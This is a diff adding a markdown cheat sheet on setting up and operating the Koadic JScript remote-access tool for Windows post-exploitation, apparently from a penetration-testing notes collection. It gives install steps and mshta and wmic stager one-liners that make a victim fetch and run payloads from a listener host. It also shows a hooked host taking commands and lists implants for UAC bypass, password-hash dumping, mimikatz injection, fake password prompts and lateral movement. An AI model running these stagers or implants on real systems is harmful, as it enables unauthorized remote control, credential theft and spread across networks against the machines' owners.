@@ -1,0 +1,123 @@
+# Koadic C3 COM Command & Control - JScript RAT
+
+> Windows post-exploitation rootkit similar to other penetration testing tools such as Meterpreter and Powershell Empire.
+
+## Installation
+
+```powershell
+git clone https://github.com/zerosum0x0/koadic
+git submodule init
+git submodule update
+pip2.7 install -r requirements.txt --user
+python2.7 koadic
+```
+
+## Set a listener
+
+```powershell
+use stager/js/mshta
+set LHOST 192.168.1.19
+set SRVPORT 4444
+run
+
+[>] mshta http://192.168.1.19:4444/6DX7f
+```
+
+```powershell
+use stager/js/wmic
+set LHOST 192.168.1.19
+set SRVPORT 4444
+run
+
+[>] wmic os get /FORMAT:"http://192.168.1.19:4444/lQGx5.xsl"
+```
+
+### Stagers
+
+Stagers hook target zombies and allow you to use implants.
+
+Module | Description
+--------|------------
+stager/js/mshta | serves payloads using MSHTA.exe HTML Applications
+stager/js/regsvr | serves payloads using regsvr32.exe COM+ scriptlets
+stager/js/wmic | serves payloads using WMIC XSL
+stager/js/rundll32_js | serves payloads using rundll32.exe
+stager/js/disk | serves payloads using files on disk
+
+
+
+## List zombies and interact with them
+
+```powershell
+(koadic: sta/js/wmic)$ zombies
+
+        ID   IP              STATUS  LAST SEEN
+        ---  ---------       ------- ------------
+        0    192.168.1.30    Alive   2018-10-04 17:07:12
+
+(koadic: sta/js/wmic)$ zombies 0
+        ID:                     0
+        Status:                 Alive
+        First Seen:             2018-10-04 17:05:00
+        Last Seen:              2018-10-04 17:14:42
+        IP:                     192.168.1.30
+        User:                   DESKTOP-68URA9U\CrashWin
+        [...]
+        Elevated:               No
+        [...]
+```
+
+Interact with `zombies zombie_id`, get a shell with `cmdshell zombie_id`.
+
+```powershell
+[koadic: ZOMBIE 0 (192.168.1.30) - C:\Users\CrashWin]> whoami
+[*] Zombie 0: Job 1 (implant/manage/exec_cmd) created.
+[+] Zombie 0: Job 1 (implant/manage/exec_cmd) completed.
+Result for `cd C:\Users\CrashWin & whoami`:
+desktop-68ura9u\crashwin
+```
+
+## Use an implant
+
+Select an implant with `use module`, then fill the `info` with `set INFO value`, finally start the module with `run`.
+
+```powershell
+(koadic: sta/js/mshta)$ use implant/phish/password_box
+(koadic: imp/phi/password_box)$ set ZOMBIE 1
+(koadic: imp/phi/password_box)$ run
+Input contents:
+MyStrongPassword123!
+```
+
+### Implants
+
+Implants start jobs on zombies.
+
+Module | Description
+--------|------------
+implant/elevate/bypassuac_eventvwr | Uses enigma0x3's eventvwr.exe exploit to bypass UAC on Windows 7, 8, and 10.
+implant/elevate/bypassuac_sdclt | Uses enigma0x3's sdclt.exe exploit to bypass UAC on Windows 10.
+implant/fun/zombie | Maxes volume and opens The Cranberries YouTube in a hidden window.
+implant/fun/voice | Plays a message over text-to-speech.
+implant/gather/clipboard | Retrieves the current content of the user clipboard.
+implant/gather/enum_domain_info | Retrieve information about the Windows domain.
+implant/gather/hashdump_sam | Retrieves hashed passwords from the SAM hive.
+implant/gather/hashdump_dc | Domain controller hashes from the NTDS.dit file.
+implant/gather/user_hunter | Locate users logged on to domain computers (using Dynamic Wrapper X).
+implant/inject/mimikatz_dynwrapx | Injects a reflective-loaded DLL to run powerkatz.dll (using Dynamic Wrapper X).
+implant/inject/mimikatz_dotnet2js | Injects a reflective-loaded DLL to run powerkatz.dll (@tirannido DotNetToJS).
+implant/inject/shellcode_excel | Runs arbitrary shellcode payload (if Excel is installed).
+implant/manage/enable_rdesktop | Enables remote desktop on the target.
+implant/manage/exec_cmd | Run an arbitrary command on the target, and optionally receive the output.
+implant/phishing/password_box | Prompt a user to enter their password.
+implant/pivot/stage_wmi | Hook a zombie on another machine using WMI.
+implant/pivot/exec_psexec | Run a command on another machine using psexec from sysinternals.
+implant/scan/tcp | Uses HTTP to scan open TCP ports on the target zombie LAN.
+implant/utils/download_file | Downloads a file from the target zombie.
+implant/utils/multi_module | Run a number of implants in succession.
+implant/utils/upload_file | Uploads a file from the listening server to the target zombies.
+
+## Thanks
+
+- [Pentestlab - koadic](https://pentestlab.blog/tag/koadic/)
+- [zerosum0x0 Github - koadic](https://github.com/zerosum0x0/koadic)
